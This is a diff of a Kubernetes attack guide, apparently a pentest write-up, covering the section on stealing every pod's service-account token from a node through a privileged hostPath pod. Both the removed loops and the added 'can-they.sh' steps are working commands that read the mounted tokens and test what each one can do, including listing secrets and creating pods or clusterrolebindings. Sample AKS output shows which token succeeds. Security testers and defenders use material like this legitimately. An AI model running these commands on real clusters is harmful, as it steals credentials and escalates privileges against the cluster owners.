@@ -155,53 +155,44 @@ grep -R "current-context" /root/
 ## Grab all tokens from all pods on the system
 You can access any secret mounted within any pod on the node you are on. In a production cluster, even on a worker node, there is usually at least one pod that has a mounted *token* that is bound to a *service account* that is bound to a *clusterrolebinding*, that gives you access to do things like create pods or view secrets in all namespaces. 
 
-Look for tokens that have permissions to get secrets in kube-system. The examples below automate this process for you a bit:
+Look for tokens that have permissions to get secrets in kube-system. 
 
-**Simply list the namespace and location of every token**
-```bash
+
+**Copy the `can-they.sh` helper script to the pod, download it from github, or manually created it**
+```
+kubectl cp can-they.sh everything-allowed-exec-pod:/
+```
+
+
+**Exec into pod (Don't chroot)** 
+```
 kubectl exec -it hostpath-exec-pod -- bash
-tokens=`find /host/var/lib/kubelet/pods/ -name token -type l`; \
-for token in $tokens; \
-do parent_dir="$(dirname "$token")"; \
-namespace=`cat $parent_dir/namespace`; \
-echo $namespace "|" $token ; \
-done | sort
 ```
 
-**Run kubectl can-i --list against ALL tokens found on the node**
-
-*Run this where you have kubectl installed, and NOT from within the priv pod.* 
-
+**Run `can-they.sh` **
 ```
-tokens=`kubectl exec -it hostpath-exec-pod -- find /host/var/lib/kubelet/pods/ -name token -type l`; \
-for filename in $tokens; \
-do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; \
-echo "Token Location: $filename_clean"; \
-tokena=`kubectl exec -it hostpath-exec-pod -- cat $filename_clean`; \
-echo "What can I do?"; \
-kubectl --token=$tokena auth can-i --list; echo; \
-done
+./can-they.sh --list
+./can-they.sh --list -n kube-system
+./can-they.sh --list -n default
+./can-they.sh list secrets -n kube-system
+./can-they.sh create pods -n kube-system
+./can-they.sh create clusterrolebindings
 ```
-This is what just happened:
-* From outside the pod, you execute `kubectl exec` to find all of the token locations on the host
-* You then iterate through the list of filenames, and
-  * Print the token location
-  * Run `kubectl auth can-i list` using each token via the `--token` command line argument.  
-* This gives you a list of the actions each token can perform cluster wide. 
-  
-The next command will do the same thing, but just in the kube-system namespace. 
 
-
-**Run kubectl can-i --list -n kube-system against ALL tokens found on the node**
+**Example Run on AKS showing gatekeeper-admin-token-jmw8z can list secrets in kube-system**
 ```
-tokens=`kubectl exec -it hostpath-exec-pod -- find /host/var/lib/kubelet/pods/ -name token -type l`; \
-for filename in $tokens; \
-do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; \
-echo "Token Location: $filename_clean"; \
-tokena=`kubectl exec -it hostpath-exec-pod -- cat $filename_clean`; \
-echo "What can I do?"; \
-kubectl --token=$tokena auth can-i --list -n kube-system; echo; \
-done
+root@aks-agentpool-76920337-vmss000000:/# ./can-they.sh list secrets -n kube-system
+--------------------------------------------------------
+Token Location: /host/var/lib/kubelet/pods/c888d3a8-743e-41dd-8464-91b3e6628174/volumes/kubernetes.io~secret/gatekeeper-admin-token-jmw8z/token
+Command: kubectl auth can-i list secrets -n kube-system
+yes
+
+--------------------------------------------------------
+Token Location: /host/var/lib/kubelet/pods/d13e311b-affa-4fad-b1c4-ec4f7817fd98/volumes/kubernetes.io~secret/metrics-server-token-ftxxd/token
+Command: kubectl auth can-i list secrets -n kube-system
+no
+
+...omitted for brevity...
 ```
 
 **Can any of the tokens:**
